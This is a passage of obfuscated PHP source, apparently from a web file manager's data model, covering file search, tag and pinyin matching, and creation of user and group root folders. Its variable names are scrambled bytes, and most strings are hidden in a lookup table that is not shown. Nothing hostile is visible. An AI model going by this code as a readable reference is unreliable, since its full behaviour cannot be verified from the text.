array($›®˘ÙÂç[7], $”µ˛ÅÇ€)))->delete(); Model($›®˘ÙÂç[470])->remove($≠Í§Ÿ„≠); } public function userSpace() { $¬™ï·ûÇ =& $_SERVER[ëæªã÷]; $Àåﬂ®ëõ = $this->tablePrefix; $›“¨Á°¨ = array($¬™ï·ûÇ[1619] => USER_ID); $ØÀ≈Í« = "{$Àåﬂ®ëõ}\x69\157\137\146\x69\x6c\x65\x20\146\x69\154\x65\163\x20\157\156\x20\146\x69\154\x65\x73\56\146\151\154\x65\x49\x44\40\75\x20\150\x69\x73\164\x6f\x72\x79\56\x66\151\x6c\x65\111\104"; return $this->alias($¬™ï·ûÇ[2038])->where($›“¨Á°¨)->join($ØÀ≈Í«, $¬™ï·ûÇ[2039])->sum($¬™ï·ûÇ[90]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÄÁõÜúÀ) { $ü˙¬ Ü™ =& $_SERVER[ëæªã÷]; $õ˙öÈˆ˛ = KodIO::fileTypeList(); $∑˜˚õ˘≥ = $õ˙öÈˆ˛[$ÄÁõÜúÀ]; if (!$∑˜˚õ˘≥) { return array(); } $‹Éﬂ”ﬁï = $∑˜˚õ˘≥[$ü˙¬ Ü™[177]]; $ìΩÜ±©√ = $ü˙¬ Ü™[7]; if (!$∑˜˚õ˘≥[$ü˙¬ Ü™[177]]) { $Ä©ó¨˚Ä = array_to_keyvalue($õ˙öÈˆ˛, $ü˙¬ Ü™[12], $ü˙¬ Ü™[177]); $‹Éﬂ”ﬁï = implode($ü˙¬ Ü™[50], $Ä©ó¨˚Ä); $ìΩÜ±©√ = $ü˙¬ Ü™[2041]; } $Ú¶≈ëƒ° = explode($ü˙¬ Ü™[50], trim($‹Éﬂ”ﬁï, $ü˙¬ Ü™[50])); return array($ìΩÜ±©√, $Ú¶≈ëƒ°); } public function listPathType($ãóãó¶ê) { $¿ ¸Õ î =& $_SERVER[ëæªã÷]; $ÿŒƒ”™Ì = $this->fileTypeWhere($ãóãó¶ê); if (!$ÿŒƒ”™Ì) { return array(); } $„§´√æ≤ = array($¿ ¸Õ î[580] => SourceModel::TYPE_USER, $¿ ¸Õ î[581] => USER_ID, $¿ ¸Õ î[577] => 0, $¿ ¸Õ î[578] => $ÿŒƒ”™Ì); return $this->listSource($„§´√æ≤); } public function listSearch($âç¨˘ô, $§áÓ∞Ãè = 300) { $∫·Ÿ∂â =& $_SERVER[ëæªã÷]; if (isset($âç¨˘ô[$∫·Ÿ∂â[1887]]) && $âç¨˘ô[$∫·Ÿ∂â[1887]]) { $âç¨˘ô[$∫·Ÿ∂â[1887]] = str_replace($∫·Ÿ∂â[388], $∫·Ÿ∂â[2042], trim($âç¨˘ô[$∫·Ÿ∂â[1887]])); } $õà¿ËŒ˘ = $this->_parseSearchWhere($âç¨˘ô); $∆ºÛ∂∏¥ = $õà¿ËŒ˘; if (!isset($õà¿ËŒ˘[$∫·Ÿ∂â[431]])) { $õà¿ËŒ˘[$∫·Ÿ∂â[431]] = 0; } $ﬂ°ïÔÊ¸ = $∫·Ÿ∂â[2043]; $≠”µŸ«∞ = $ﬂ°ïÔÊ¸; $this->_listSearchBindPinyin($âç¨˘ô, $õà¿ËŒ˘, $ﬂ°ïÔÊ¸); $this->alias($∫·Ÿ∂â[444])->_makeOrder(); $õà¿ËŒ˘ = $this->parseWhereLike($õà¿ËŒ˘); $òÅ˝ô…° = $this->distinct(!0)->field($ﬂ°ïÔÊ¸)->where($õà¿ËŒ˘)->selectPage($§áÓ∞Ãè); $this->_listSearchFileContent($òÅ˝ô…°, $âç¨˘ô, $≠”µŸ«∞, $∆ºÛ∂∏¥); $this->_listSearchDesc($òÅ˝ô…°, $âç¨˘ô, $≠”µŸ«∞); $this->_listSearchTag($òÅ˝ô…°, $âç¨˘ô, $≠”µŸ«∞); $this->_listSearchGroupTag($òÅ˝ô…°, $âç¨˘ô, $≠”µŸ«∞); $this->_listDataApply($òÅ˝ô…°[$∫·Ÿ∂â[373]]); $this->_listMake($òÅ˝ô…°); return $òÅ˝ô…°; } private function _listSearchFileContent(&$íÁ¯äãÈ, $≈ÅßÓ“â, $ºÕ√˙Äí, $·†æ¿Ñ—) { $Ù¿ºπÒ¯ =& $_SERVER[ëæªã÷]; if (!$≈ÅßÓ“â[$Ù¿ºπÒ¯[1887]] || $íÁ¯äãÈ[$Ù¿ºπÒ¯[370]][$Ù¿ºπÒ¯[357]] > 1) { return; } if (!isset($·†æ¿Ñ—[$Ù¿ºπÒ¯[32]]) || !is_array($≈ÅßÓ“â[$Ù¿ºπÒ¯[467]])) { return; } $·†æ¿Ñ—[$Ù¿ºπÒ¯[467]] = array($Ù¿ºπÒ¯[7], $≈ÅßÓ“â[$Ù¿ºπÒ¯[467]]); unset($·†æ¿Ñ—[$Ù¿ºπÒ¯[32]]); unset($≈ÅßÓ“â[$Ù¿ºπÒ¯[467]]); $∑≈æú˘ = $this->field($ºÕ√˙Äí)->where($·†æ¿Ñ—)->limit($Ù¿ºπÒ¯[2044])->select(); if (!$∑≈æú˘ || count($∑≈æú˘) == 0) { return; } $íÁ¯äãÈ[$Ù¿ºπÒ¯[373]] = array_merge($∑≈æú˘, $íÁ¯äãÈ[$Ù¿ºπÒ¯[373]]); $íÁ¯äãÈ[$Ù¿ºπÒ¯[370]][$Ù¿ºπÒ¯[371]] += count($∑≈æú˘); } private function _listSearchTag(&$–Æé¢úŸ, $ï∆∑¿™Ì, $¸ÔΩåÄõ) { $ôôÛò·Ø =& $_SERVER[ëæªã÷]; if (!$ï∆∑¿™Ì[$ôôÛò·Ø[1887]] || $–Æé¢úŸ[$ôôÛò·Ø[370]][$ôôÛò·Ø[357]] > 1) { return; } $¥ÙÉ‰∂¨ = Model($ôôÛò·Ø[2045])->listData(); $◊£ñöÇá = array(); $ùÈ¢ó∑ÿ = $ï∆∑¿™Ì[$ôôÛò·Ø[1887]]; foreach ($¥ÙÉ‰∂¨ as $ÚÂÄ”∞Ã) { $†⁄£ÙÕ≈ = $ÚÂÄ”∞Ã[$ôôÛò·Ø[32]]; $‚œ˜ÊÒù = str_replace($ôôÛò·Ø[53], $ôôÛò·Ø[12], Pinyin::get($†⁄£ÙÕ≈)); if (stripos($†⁄£ÙÕ≈, $ùÈ¢ó∑ÿ) !== !1 || stripos($‚œ˜ÊÒù, $ùÈ¢ó∑ÿ) !== !1) { $◊£ñöÇá[] = $ÚÂÄ”∞Ã[$ôôÛò·Ø[401]]; } } if (!$◊£ñöÇá) { return; } $ñÔª™Ëû = array($ôôÛò·Ø[427] => array($ôôÛò·Ø[7], $◊£ñöÇá), $ôôÛò·Ø[1628] => USER_ID); $æ†¥Í“è = Model($ôôÛò·Ø[428])->field($ôôÛò·Ø[88])->where($ñÔª™Ëû)->select(); $æ†¥Í“è = array_to_keyvalue($æ†¥Í“è, $ôôÛò·Ø[12], $ôôÛò·Ø[88]); $ÚŸèïŒ’ = array_unique($æ†¥Í“è); $this->_listSearchMerge($–Æé¢úŸ, $ï∆∑¿™Ì, $¸ÔΩåÄõ, $ÚŸèïŒ’); } private function _listSearchDesc(&$∑õŒ•˝’, $˜⁄π®Îå, $µæ»ï‰‡) { $±∆èÜ›‡ =& $_SERVER[ëæªã÷]; if (!$˜⁄π®Îå[$±∆èÜ›‡[1887]] || $∑õŒ•˝’[$±∆èÜ›‡[370]][$±∆èÜ›‡[357]] > 1) { return; } $„˝ÇıÔÂ = $this->listSearchChildren($˜⁄π®Îå[$±∆èÜ›‡[498]]); $„˝ÇıÔÂ = array_unique($„˝ÇıÔÂ); if (!$„˝ÇıÔÂ) { return; } $∫ﬂŸŸƒÖ = array($±∆èÜ›‡[403] => array($±∆èÜ›‡[7], $„˝ÇıÔÂ), $±∆èÜ›‡[105] => $±∆èÜ›‡[451], $±∆èÜ›‡[378] => array($±∆èÜ›‡[387], $±∆èÜ›‡[1889] . $˜⁄π®Îå[$±∆èÜ›‡[1887]] . $±∆èÜ›‡[1889])); $ÙÓº◊∑î = Model($±∆èÜ›‡[563])->field($±∆èÜ›‡[403])->where($∫ﬂŸŸƒÖ)->select(); $Ù‹è·öÙ = array_to_keyvalue($ÙÓº◊∑î, $±∆èÜ›‡[12], $±∆èÜ›‡[403]); $this->_listSearchMerge($∑õŒ•˝’, $˜⁄π®Îå, $µæ»ï‰‡, $Ù‹è·öÙ); } private function _listSearchGroupTag(&$≈·Ú€‡Ú, $ª«Üñ˙Ò, $Ñ©ç¸÷æ) { $ßı√˘Ñã =& $_SERVER[ëæªã÷]; if (!$ª«Üñ˙Ò[$ßı√˘Ñã[1887]] || $≈·Ú€‡Ú[$ßı√˘Ñã[370]][$ßı√˘Ñã[357]] > 1 || !$ª«Üñ˙Ò[$ßı√˘Ñã[498]]) { return; } $ÀµµΩ‡É = $this->sourceInfo($ª«Üñ˙Ò[$ßı√˘Ñã[498]]); if (!$ÀµµΩ‡É || $ÀµµΩ‡É[$ßı√˘Ñã[412]] != SourceModel::TYPE_GROUP) { return; } $Ÿòª°·Ó = $ÀµµΩ‡É[$ßı√˘Ñã[504]]; $‘Ûã«ﬂ = Model($ßı√˘Ñã[2046])->get($Ÿòª°·Ó); $ŸòèøñÍ = array(); $Ò“§‹©Ú = $ª«Üñ˙Ò[$ßı√˘Ñã[1887]]; foreach ($‘Ûã«ﬂ[$ßı√˘Ñã[373]] as $≈‡âñåã) { $¿õø«ø¢ = $≈‡âñåã[$ßı√˘Ñã[32]]; $Ô‘µ’÷∆ = str_replace($ßı√˘Ñã[53], $ßı√˘Ñã[12], Pinyin::get($¿õø«ø¢)); if (stripos($¿õø«ø¢, $Ò“§‹©Ú) !== !1 || stripos($Ô‘µ’÷∆, $Ò“§‹©Ú) !== !1) { $ŸòèøñÍ[] = $≈‡âñåã[$ßı√˘Ñã[401]]; } } if (!$ŸòèøñÍ) { return; } $è˛ﬁá‰˘ = array($ßı√˘Ñã[427] => array($ßı√˘Ñã[7], $ŸòèøñÍ), $ßı√˘Ñã[1628] => 0, $ßı√˘Ñã[33] => $ßı√˘Ñã[1909] . $Ÿòª°·Ó); $ë’ö‚Îë = Model($ßı√˘Ñã[428])->field($ßı√˘Ñã[88])->where($è˛ﬁá‰˘)->select(); $ë’ö‚Îë = array_to_keyvalue($ë’ö‚Îë, $ßı√˘Ñã[12], $ßı√˘Ñã[88]); $Í≤áÆå† = array_unique($ë’ö‚Îë); $this->_listSearchMerge($≈·Ú€‡Ú, $ª«Üñ˙Ò, $Ñ©ç¸÷æ, $Í≤áÆå†); } private function _listSearchMerge(&$ªíãºì±, $§öí‘⁄ÿ, $∏àˆ•àΩ, $Äî‘Æ˜Í) { $’∑◊ØΩÁ =& $_SERVER[ëæªã÷]; if (!$Äî‘Æ˜Í) { return; } $ä§øŒãﬁ = array_to_keyvalue($ªíãºì±[$’∑◊ØΩÁ[373]], $’∑◊ØΩÁ[12], $’∑◊ØΩÁ[403]); $≠ΩÄ∏∞« = array_diff($Äî‘Æ˜Í, $ä§øŒãﬁ); if (!$≠ΩÄ∏∞«) { return; } $ìÃ˜ç∞Ü = array($’∑◊ØΩÁ[403] => array($’∑◊ØΩÁ[7], $≠ΩÄ∏∞«)); $ÙÜÆƒ≈º = $this->field($∏àˆ•àΩ)->where($ìÃ˜ç∞Ü)->select(); if (!$ÙÜÆƒ≈º) { return; } $ÓÏÙëöÂ = array(); foreach ($ÙÜÆƒ≈º as $å¢Ö·˝∂) { if ($this->_listSearchFilter($å¢Ö·˝∂, $§öí‘⁄ÿ)) { $ÓÏÙëöÂ[] = $å¢Ö·˝∂; } } $ªíãºì±[$’∑◊ØΩÁ[373]] = array_merge($ÓÏÙëöÂ, $ªíãºì±[$’∑◊ØΩÁ[373]]); $ªíãºì±[$’∑◊ØΩÁ[370]][$’∑◊ØΩÁ[371]] += count($ÓÏÙëöÂ); } private function _listSearchFilter($ŸÈÚ›Ÿ≈, $◊ºë¡…ø) { $„ˆÛ…˛ª =& $_SERVER[ëæªã÷]; $ë’ çøõ = $ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[411]] == $„ˆÛ…˛ª[99]; if (!strstr($ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[521]], $„ˆÛ…˛ª[50] . $◊ºë¡…ø[$„ˆÛ…˛ª[498]] . $„ˆÛ…˛ª[50])) { return !1; } if (isset($◊ºë¡…ø[$„ˆÛ…˛ª[413]]) && $◊ºë¡…ø[$„ˆÛ…˛ª[413]] != $„ˆÛ…˛ª[1850]) { if ($◊ºë¡…ø[$„ˆÛ…˛ª[413]] == $„ˆÛ…˛ª[89] && !$ë’ çøõ) { return !1; } if ($◊ºë¡…ø[$„ˆÛ…˛ª[413]] != $„ˆÛ…˛ª[89] && $ë’ çøõ) { return !1; } if (!strstr($ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[177]], $„ˆÛ…˛ª[50] . $◊ºë¡…ø[$„ˆÛ…˛ª[413]] . $„ˆÛ…˛ª[50])) { return !1; } } if (isset($◊ºë¡…ø[$„ˆÛ…˛ª[2047]]) && $◊ºë¡…ø[$„ˆÛ…˛ª[2047]] < $ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[90]]) { return !1; } if (isset($◊ºë¡…ø[$„ˆÛ…˛ª[2048]]) && $◊ºë¡…ø[$„ˆÛ…˛ª[2048]] > $ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[90]]) { return !1; } if (isset($◊ºë¡…ø[$„ˆÛ…˛ª[594]]) && $◊ºë¡…ø[$„ˆÛ…˛ª[594]] != $ŸÈÚ›Ÿ≈[$„ˆÛ…˛ª[454]]) { return !1; } return !0; } public function listSearchChildren($ö›õ§≈, $ÀÛ˝∑É• = 5000) { $·⁄†Òü =& $_SERVER[ëæªã÷]; $›Ò≈®’Ï = array(); $íûıÜÿ◊ = $this->sourceInfo($ö›õ§≈); $®ºë∞˚¿ = array($·⁄†Òü[521] => array($·⁄†Òü[387], $íûıÜÿ◊[$·⁄†Òü[521]] . $íûıÜÿ◊[$·⁄†Òü[403]] . $·⁄†Òü[545])); $î„∆ˆË… = $this->field($·⁄†Òü[90])->where($®ºë∞˚¿)->limit($ÀÛ˝∑É• + 1)->select(); $⁄™‰ç«¨ = is_array($î„∆ˆË…) ? count($î„∆ˆË…) : 0; if ($⁄™‰ç«¨ > $ÀÛ˝∑É•) { return $this->_listSearchChildrenNear($ö›õ§≈, $ÀÛ˝∑É•); } $ÛåÃª©« = $this->field($·⁄†Òü[403])->where($®ºë∞˚¿)->select(); $›Ò≈®’Ï = array_to_keyvalue($ÛåÃª©«, $·⁄†Òü[12], $·⁄†Òü[403]); return $›Ò≈®’Ï; } private function _listSearchChildrenNear($˛Î∏Æä¡, $Ú◊ö∏˛Ü) { $°™®√«≥ =& $_SERVER[ëæªã÷]; $í†≠ó◊ = array(); $∏ë‰„ÿ£ = array($°™®√«≥[498] => $˛Î∏Æä¡); $Ûé÷ÚÑ· = $this->field($°™®√«≥[2049])->where($∏ë‰„ÿ£)->select(); $ÄﬂºÛ„Á = array_to_keyvalue(array_filter_by_field($Ûé÷ÚÑ·, $°™®√«≥[411], $°™®√«≥[99]), $°™®√«≥[12], $°™®√«≥[403]); $í†≠ó◊ = array_merge($í†≠ó◊, array_to_keyvalue($Ûé÷ÚÑ·, $°™®√«≥[12], $°™®√«≥[403])); if (!$ÄﬂºÛ„Á) { return $í†≠ó◊; } $∏ë‰„ÿ£ = array($°™®√«≥[498] => array($°™®√«≥[7], $ÄﬂºÛ„Á)); $Ûé÷ÚÑ· = $this->field($°™®√«≥[2049])->where($∏ë‰„ÿ£)->limit($Ú◊ö∏˛Ü)->select(); $í†≠ó◊ = array_merge($í†≠ó◊, array_to_keyvalue($Ûé÷ÚÑ·, $°™®√«≥[12], $°™®√«≥[403])); $í†≠ó◊ = array_slice($í†≠ó◊, 0, $Ú◊ö∏˛Ü); return $í†≠ó◊; } private function _listSearchBindPinyin($â∆ ˝¨°, &$úÕÅ’áı, &$‚¿¿ãﬁ€) { $ìöÑê€À =& $_SERVER[ëæªã÷]; if (!isset($â∆ ˝¨°[$ìöÑê€À[1887]]) || !$â∆ ˝¨°[$ìöÑê€À[1887]]) { return; } if (!Input::check($â∆ ˝¨°[$ìöÑê€À[1887]], $ìöÑê€À[322]) || strlen($â∆ ˝¨°[$ìöÑê€À[1887]]) < 2) { return; } $∂ë∏‹€† = "\114\x45\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\157\137\x73\x6f\x75\x72\x63\145\x5f\155\145\164\x61\x20\155\145\164\x61\x20\157\156\x20\163\x6f\165\162\143\145\56\163\157\x75\162\x63\145\111\x44\40\x3d\x20\x6d\145\164\x61\56\163\157\165\162\x63\x65\x49\104"; $Åü€ÉÀâ = array(); $‚¿¿ãﬁ€ = str_replace(array($ìöÑê€À[65], $ìöÑê€À[53], $ìöÑê€À[2050]), $ìöÑê€À[12], $‚¿¿ãﬁ€); $‚¿¿ãﬁ€ = $ìöÑê€À[436] . str_replace($ìöÑê€À[50], $ìöÑê€À[437], $‚¿¿ãﬁ€); $ ØîôÂà = $úÕÅ’áı[$ìöÑê€À[32]]; unset($úÕÅ’áı[$ìöÑê€À[32]]); foreach ($úÕÅ’áı as $˚Äœ¸‘∑ => $Ω◊ÏÅ»‹) { $Åü€ÉÀâ[$ìöÑê€À[436] . $˚Äœ¸‘∑] = $Ω◊ÏÅ»‹; } foreach ($ ØîôÂà as $˚¢ñæô˚) { $Åü€ÉÀâ[] = array($ìöÑê€À[441] => $˚¢ñæô˚, $ìöÑê€À[976] => $ìöÑê€À[1891], array($ìöÑê€À[2051] => $˚¢ñæô˚, $ìöÑê€À[2052] => array($ìöÑê€À[7], array($ìöÑê€À[464], $ìöÑê€À[463])))); } $this->join($∂ë∏‹€†); $úÕÅ’áı = $Åü€ÉÀâ; } private function _parseSearchWhere($‘äªûÃÈ) { $Úºûü°˛ =& $_SERVER[ëæªã÷]; $‘≤ºı£Ô = array(); if (isset($‘äªûÃÈ[$Úºûü°˛[741]]) && $‘äªûÃÈ[$Úºûü°˛[741]]) { $‘≤ºı£Ô[$Úºûü°˛[96]] = array($Úºûü°˛[2053], $‘äªûÃÈ[$Úºûü°˛[741]]); } if (isset($‘äªûÃÈ[$Úºûü°˛[496]]) && $‘äªûÃÈ[$Úºûü°˛[496]]) { $≤Ÿ·”Í’ = array($Úºûü°˛[2054], $‘äªûÃÈ[$Úºûü°˛[496]]); if ($‘≤ºı£Ô[$Úºûü°˛[96]]) { $‘≤ºı£Ô[$Úºûü°˛[96]] = array($‘≤ºı£Ô[$Úºûü°˛[96]], $≤Ÿ·”Í’, $Úºûü°˛[2055]); } else { $‘≤ºı£Ô[$Úºûü°˛[96]] = $≤Ÿ·”Í’; } } if (isset($‘äªûÃÈ[$Úºûü°˛[2047]]) && $‘äªûÃÈ[$Úºûü°˛[2047]] > 0) { $‘≤ºı£Ô[$Úºûü°˛[90]] = array($Úºûü°˛[2053], $‘äªûÃÈ[$Úºûü°˛[2047]]); } if (isset($‘äªûÃÈ[$Úºûü°˛[2048]]) && $‘äªûÃÈ[$Úºûü°˛[2048]]) { $≤Ÿ·”Í’ = array($Úºûü°˛[2054], $‘äªûÃÈ[$Úºûü°˛[2048]]); if ($‘≤ºı£Ô[$Úºûü°˛[90]]) { $‘≤ºı£Ô[$Úºûü°˛[90]] = array($‘≤ºı£Ô[$Úºûü°˛[90]], $≤Ÿ·”Í’, $Úºûü°˛[2055]); } else { $‘≤ºı£Ô[$Úºûü°˛[90]] = $≤Ÿ·”Í’; } } if (isset($‘äªûÃÈ[$Úºûü°˛[594]]) && $‘äªûÃÈ[$Úºûü°˛[594]]) { $‘≤ºı£Ô[] = array($Úºûü°˛[454] => $‘äªûÃÈ[$Úºûü°˛[594]], $Úºûü°˛[452] => $‘äªûÃÈ[$Úºûü°˛[594]], $Úºûü°˛[976] => $Úºûü°˛[1891]); } if (isset($‘äªûÃÈ[$Úºûü°˛[413]]) && $‘äªûÃÈ[$Úºûü°˛[413]]) { $Øî⁄ø†Ô = $‘äªûÃÈ[$Úºûü°˛[413]]; if ($Øî⁄ø†Ô == $Úºûü°˛[89]) { $‘≤ºı£Ô[$Úºûü°˛[411]] = 1; } else { if ($Øî⁄ø†Ô == $Úºûü°˛[2056]) { $‘≤ºı£Ô[$Úºûü°˛[411]] = 0; } else { if ($Øî⁄ø†Ô) { $Øî⁄ø†Ô = is_array($Øî⁄ø†Ô) ? $Øî⁄ø†Ô : explode($Úºûü°˛[50], $Øî⁄ø†Ô); $‘≤ºı£Ô[$Úºûü°˛[413]] = array($Úºûü°˛[419], $Øî⁄ø†Ô); $‘≤ºı£Ô[$Úºûü°˛[411]] = 0; } } } } $this->_parseSearchParent($‘äªûÃÈ, $‘≤ºı£Ô); if (isset($‘äªûÃÈ[$Úºûü°˛[1887]]) && trim($‘äªûÃÈ[$Úºûü°˛[1887]])) { $˘˝Á¥˚Ÿ = trim($‘äªûÃÈ[$Úºûü°˛[1887]]); $”≈´£‚√ = explode($Úºûü°˛[53], $˘˝Á¥˚Ÿ); if (strlen($˘˝Á¥˚Ÿ) > 2 && (substr($˘˝Á¥˚Ÿ, 0, 1) == $Úºûü°˛[127] && substr($˘˝Á¥˚Ÿ, -1) == $Úºûü°˛[127]) || substr($˘˝Á¥˚Ÿ, 0, 1) == $Úºûü°˛[58] && substr($˘˝Á¥˚Ÿ, -1) == $Úºûü°˛[58]) { $˘˝Á¥˚Ÿ = substr($˘˝Á¥˚Ÿ, 1, -1); $”≈´£‚√ = array($˘˝Á¥˚Ÿ); } $‘≤ºı£Ô[$Úºûü°˛[32]] = array(array($Úºûü°˛[544], $Úºûü°˛[1889] . $˘˝Á¥˚Ÿ . $Úºûü°˛[1889])); if (count($”≈´£‚√) > 1) { $‘≤ºı£Ô[$Úºûü°˛[32]] = array(); foreach ($”≈´£‚√ as $ô»∏ñçÆ) { if (!trim($ô»∏ñçÆ)) { continue; } $‘≤ºı£Ô[$Úºûü°˛[32]][] = array($Úºûü°˛[544], $Úºûü°˛[1889] . trim($ô»∏ñçÆ) . $Úºûü°˛[1889]); } } } return $‘≤ºı£Ô; } private function _parseSearchParent($’ΩÓ»õ⁄, &$¡ÀùÌ⁄±) { $·òãì˘Ï =& $_SERVER[ëæªã÷]; if (!isset($’ΩÓ»õ⁄[$·òãì˘Ï[498]]) || !$’ΩÓ»õ⁄[$·òãì˘Ï[498]]) { return; } $á£•œÄë = $this->pathInfo($’ΩÓ»õ⁄[$·òãì˘Ï[498]]); $®§íåÈ´ = $á£•œÄë[$·òãì˘Ï[498]] . $·òãì˘Ï[12] === $·òãì˘Ï[200]; $´Ô≤¨⁄€ = $á£•œÄë[$·òãì˘Ï[412]] == $·òãì˘Ï[515]; $¡ÀùÌ⁄±[$·òãì˘Ï[584]] = array($·òãì˘Ï[544], $á£•œÄë[$·òãì˘Ï[521]] . $’ΩÓ»õ⁄[$·òãì˘Ï[498]] . $·òãì˘Ï[545]); $ÂÎ∆π°Ÿ = isset($’ΩÓ»õ⁄[$·òãì˘Ï[1755]]) && in_array($·òãì˘Ï[515], $’ΩÓ»õ⁄[$·òãì˘Ï[1755]]); if (!$ÂÎ∆π°Ÿ || !$´Ô≤¨⁄€ || !$®§íåÈ´ || !$á£•œÄë[$·òãì˘Ï[414]]) { return; } if (!AuthModel::authCheckRoot($á£•œÄë[$·òãì˘Ï[414]][$·òãì˘Ï[415]])) { return; } $á≠ëöπ¬ = $á£•œÄë[$·òãì˘Ï[504]] . $·òãì˘Ï[12]; if ($á≠ëöπ¬ == $·òãì˘Ï[99]) { unset($¡ÀùÌ⁄±[$·òãì˘Ï[584]]); $¡ÀùÌ⁄±[$·òãì˘Ï[412]] = self::TYPE_GROUP; return; } $ö∑öûÀ≈ = Model($·òãì˘Ï[522])->groupChildrenAll($á≠ëöπ¬); $ñÔ¿óÓ√ = count($ö∑öûÀ≈); if ($ñÔ¿óÓ√ <= 1) { return; } $Ì•¿¥˚À = array($·òãì˘Ï[498] => 0, $·òãì˘Ï[412] => self::TYPE_GROUP, $·òãì˘Ï[504] => array($·òãì˘Ï[7], $ö∑öûÀ≈)); $ﬁÀÑÏﬁ© = $this->field($·òãì˘Ï[2057])->where($Ì•¿¥˚À)->limit($ñÔ¿óÓ√)->select(); $¡ÀùÌ⁄±[$·òãì˘Ï[584]] = array(); foreach ($ﬁÀÑÏﬁ© as $ç¡ÈµÓ¶) { $¡ÀùÌ⁄±[$·òãì˘Ï[584]][] = array($·òãì˘Ï[544], $·òãì˘Ï[531] . $ç¡ÈµÓ¶[$·òãì˘Ï[403]] . $·òãì˘Ï[545]); } $¡ÀùÌ⁄±[$·òãì˘Ï[584]][] = $·òãì˘Ï[1891]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ß¨®Õ·ù) { $Â«öóéÌ =& $_SERVER[ëæªã÷]; $ÚÜ…˜åñ = Model($Â«öóéÌ[513])->where(array($Â«öóéÌ[1619] => $ß¨®Õ·ù))->find(); $ŒÎŸÃ¿∞ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ß¨®Õ·ù, $ÚÜ…˜åñ[$Â«öóéÌ[32]]); $this->userDesktopAdd($ŒÎŸÃ¿∞); return $ŒÎŸÃ¿∞; } public function userDesktopAdd($∆™…õÉË) { $∂∏Êà„ï =& $_SERVER[ëæªã÷]; $ΩŒªñ∫  = LNG($∂∏Êà„ï[2058]); $‹ÓáÚºﬂ = $this->mkdir($∆™…õÉË, $ΩŒªñ∫ ); $this->metaSet($‹ÓáÚºﬂ, $∂∏Êà„ï[2059], $∂∏Êà„ï[99]); $this->metaSet($∆™…õÉË, $∂∏Êà„ï[2060], $‹ÓáÚºﬂ); } public function groupRootAdd($ˆ¡¿ˆÎë) { $Å¿‹∫≥ì =& $_SERVER[ëæªã÷]; $¸ñﬂ≠®¿ = Model($Å¿‹∫≥ì[522])->where(array($Å¿‹∫≥ì[1883] => $ˆ¡¿ˆÎë))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ˆ¡¿ˆÎë, $¸ñﬂ≠®¿[$Å¿‹∫≥ì[32]]); } public function systemRootPathAdd($¸π¥™Ù˚) { if ($¸π¥™Ù˚ != $_SERVER[ëæªã÷][537]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¸π¥™Ù˚); } public function userRootRemove($— å‘óÇ) { $Ó„˘ÁÅ¡ = $this->sourceRoot(SourceModel::TYPE_USER, $— å‘óÇ); if (!$Ó„˘ÁÅ¡) { return; } $this->remove($Ó„˘ÁÅ¡, !1); } public function groupRootRemove($˙ü«Ù„≠) { $´Æß≠«Â = $this->sourceRoot(SourceModel::TYPE_GROUP, $˙ü«Ù„≠); if (!$´Æß≠«Â) { return; } $this->remove($´Æß≠«Â, !1); } private function _mkdirRoot($èâË§˝§, $®ˆÙÊùé, $Ω¨ÛÏÌ∆) { $√ˆ∞Èã  =& $_SERVER[ëæªã÷]; $Œ˚Ï∞´ù = array($√ˆ∞Èã [402] => 0, $√ˆ∞Èã [580] => $èâË§˝§, $√ˆ∞Èã [581] => $®ˆÙÊùé, $√ˆ∞Èã [577] => 1, $√ˆ∞Èã [582] => USER_ID, $√ˆ∞Èã [583] => USER_ID, $√ˆ∞Èã [578] => $√ˆ∞Èã [12], $√ˆ∞Èã [584] => $√ˆ∞Èã [531], $√ˆ∞Èã [430] => 0, $√ˆ∞Èã [579] => 0, $√ˆ∞Èã [468] => 0, $√ˆ∞Èã [585] => $√ˆ∞Èã [12]); if ($ÊË†Õ·‹ = $this->where($Œ˚Ï∞´ù)->find()) { return $ÊË†Õ·‹[$√ˆ∞Èã [403]]; } $ãÕ‹ÑÑª = "\x4d\x6f\144\145\x6c\123\157\165\162\x63\x65\56\155\x6b\x64\151\x72\x52\157\x6f\x74\56{$èâË§˝§}\56{$®ˆÙÊùé}\56" . $Ω¨ÛÏÌ∆; CacheLock::lock($ãÕ‹ÑÑª); $Œ˚Ï∞´ù[$√ˆ∞Èã [32]] = $Ω¨ÛÏÌ∆; $Å≤Ò˙Ïƒ = $this->add($Œ˚Ï∞´ù); $Ìÿ‰ ëæ = array($√ˆ∞Èã [586] => short_id($Å≤Ò˙Ïƒ)); $this->where(array($√ˆ∞Èã [418] => $Å≤Ò˙Ïƒ))->save($Ìÿ‰ ëæ); CacheLock::unlock($ãÕ‹ÑÑª); return $Å≤Ò˙Ïƒ; } private function sourceRoot($¨ÇËßá, $»‡ïµö‡, $‚ÑÕ˝∫Á = false) { $ﬁö€ô˛‘ =& $_SERVER[ëæªã÷]; $Ωß÷◊òª = array($ﬁö€ô˛‘[402] => 0, $ﬁö€ô˛‘[580] => $¨ÇËßá, $ﬁö€ô˛‘[581] => $»‡ïµö‡); if ($˙ØÕ£‰÷ = $this->where($Ωß÷◊òª)->find()) { return $‚ÑÕ˝∫Á ? $˙ØÕ£‰÷ : $˙ØÕ£‰÷[$ﬁö€ô˛‘[403]]; } return !1; } public function sourceRootGroup($‹†Èî‚ù) { $⁄•¥ÑàÀ =& $_SERVER[ëæªã÷]; if (is_string($‹†Èî‚ù)) { $‹†Èî‚ù = array($‹†Èî‚ù); } $æ˜¶˘˙ˆ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‹†Èî‚ù, $⁄•¥ÑàÀ[191]); $ìâãê‡Œ = array($⁄•¥ÑàÀ[373] => $æ˜¶˘˙ˆ, $⁄•¥ÑàÀ[370] => array($⁄•¥ÑàÀ[739] => count($‹†Èî‚ù))); $this->_listDataApply($ìâãê‡Œ[$⁄•¥ÑàÀ[373]]); $this->_listMake($ìâãê‡Œ); return array_to_keyvalue($ìâãê‡Œ[$⁄•¥ÑàÀ[87]], 